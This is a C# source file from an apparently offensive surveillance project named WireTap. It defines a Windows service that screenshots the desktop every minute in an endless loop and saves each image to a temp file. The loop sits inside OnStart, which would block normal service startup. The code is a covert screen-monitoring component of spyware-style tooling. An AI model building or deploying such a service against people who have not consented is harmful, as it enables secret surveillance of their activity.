namespace WireTap.WindowsService
{
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Diagnostics;
    using System.Linq;
    using System.ServiceProcess;
    using System.Text;
    using System.Threading.Tasks;

    partial class ScreenshotService : ServiceBase
    {
        public ScreenshotService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Console.WriteLine("Inside captureScreenshot");

            while (true)
            {
                var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
                Display.CaptureImage(tempFile);
                Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
                Task.Run(() => Task.Delay(TimeSpan.FromMinutes(1))).Wait();
            }
        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }
    }
}
